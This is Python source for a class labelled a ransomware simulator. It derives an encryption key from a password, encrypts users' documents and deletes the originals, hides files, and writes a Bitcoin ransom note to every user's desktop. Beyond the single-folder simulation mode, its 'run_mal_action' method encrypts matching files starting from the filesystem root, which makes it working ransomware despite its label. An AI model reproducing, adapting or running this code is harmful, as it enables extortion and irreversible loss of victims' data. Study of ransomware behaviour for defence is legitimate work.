import os
import time
import ctypes
import base64
import platform
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


class RansomwareSimulator:
    def __init__(self):
        self.simulation = False
        self.base_path = None

    @staticmethod
    def hide_file(filepath):
        """Hide file on Windows (simulate locker)"""
        system = platform.system()
        if system == "Windows":
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(str(filepath), FILE_ATTRIBUTE_HIDDEN)
        elif system == "Linux" or system == "Darwin":
            dirname, filename = os.path.split(filepath)
            if not filename.startswith('.'):
                os.rename(filepath, os.path.join(dirname, '.' + filename))

    @staticmethod
    def lock_files_temporarily(file_list, duration=5):
        """
        Simulate temporary lock by renaming files with a lock prefix
        and restoring them after `duration` seconds.
        """
        locked = []
        for file in file_list:
            locked_name = file + ".locked"
            os.rename(file, locked_name)
            locked.append((locked_name, file))
            print(f"[LOCKED] {file}")

        time.sleep(duration)

        for locked_name, original_name in locked:
            os.rename(locked_name, original_name)
            print(f"[UNLOCKED] {original_name}")

    @staticmethod
    def encrypt_file(filepath, key):
        f = Fernet(key)
        with open(filepath, 'rb') as file:
            original = file.read()
        encrypted = f.encrypt(original)
        with open(filepath + '.enc', 'wb') as file:
            file.write(encrypted)
        os.remove(filepath)

    @staticmethod
    def generate_key(password: str, salt_file="salt.bin"):
        if os.path.exists(salt_file):
            with open(salt_file, 'rb') as f:
                salt = f.read()
        else:
            salt = os.urandom(16)
            with open(salt_file, 'wb') as f:
                f.write(salt)

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=390000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key

    @staticmethod
    def decrypt_file(filepath, key):
        f = Fernet(key)
        with open(filepath, 'rb') as file:
            encrypted = file.read()
        decrypted = f.decrypt(encrypted)
        orig_path = filepath.replace('.enc', '')
        with open(orig_path, 'wb') as file:
            file.write(decrypted)
        os.remove(filepath)

    def drop_ransom_note(self, btc_address="1FakeBTCAddr123", recover_mail="recover@fakeemail.onion"):
        file_name = "README_RESTORE_FILES.txt"
        note = f"""
YOUR FILES HAVE BEEN ENCRYPTED.

Send 0.05 BTC to: {btc_address}
Then contact: {recover_mail}

Failure to do so will result in permanent loss of your data.
"""
        if self.simulation:
            note_path = os.path.join(self.base_path, file_name)
            with open(note_path, "w") as f:
                f.write(note)
        else:
            desktop_paths = self.get_all_user_desktops()
            for desktop in desktop_paths:
                try:
                    file_path = desktop / file_name
                    with open(file_path, "w") as f:
                        f.write(note)
                except PermissionError:
                    print(f"[ERROR] Permission denied for: {desktop}")
                except Exception as e:
                    print(f"[ERROR] Error creating file on {desktop}: {e}")

    @staticmethod
    def get_all_user_desktops():
        system = platform.system()
        desktop_paths = []
        users_dir = ""
        if system == "Windows":
            users_dir = Path("C:/Users")
        elif system == "Linux" or system == "Darwin":
            users_dir = Path("/Users" if system == "Darwin" else "/home")

        if users_dir and len(str(users_dir)) > 0:
            for user_dir in users_dir.iterdir():
                desktop = user_dir / "Desktop"
                if desktop.exists():
                    desktop_paths.append(desktop)

        return desktop_paths

    @staticmethod
    def find_files(target_dir, extensions=(".txt", ".docx", ".xlsx")):
        found = []
        for root, _, files in os.walk(target_dir):
            for f in files:
                if any(f.endswith(ext) for ext in extensions):
                    found.append(os.path.join(root, f))
        return found

    def run_decrypt(self, base_path, password, salt_file="salt.bin"):
        if not os.path.exists(salt_file):
            print("[ERROR] Salt file not found. Cannot decrypt.")
            return

        key = self.generate_key(password, salt_file)
        files = self.find_files(base_path, [".enc"])

        for f in files:
            try:
                self.decrypt_file(f, key)
                print(f"[DECRYPTED] {f}")
            except Exception as e:
                print(f"[FAILED] Could not decrypt {f}: {e}")

    def run_simulation(self, base_path, password="supersecret"):
        self.simulation = True
        self.base_path = base_path
        key = self.generate_key(password)
        print(f"[INFO] AES key derived using stored salt.")

        files = self.find_files(base_path)
        self.lock_files_temporarily(files, duration=10)
        for f in files:
            self.encrypt_file(f, key)
            print(f"[ENCRYPTED] {f}")

        self.drop_ransom_note(base_path)
        print("[INFO] Ransom note dropped.")

    def run_mal_action(self, password, path="/"):
        key = self.generate_key(password)
        files = self.find_files(path)
        for f in files:
            self.encrypt_file(f, key)
        self.drop_ransom_note()
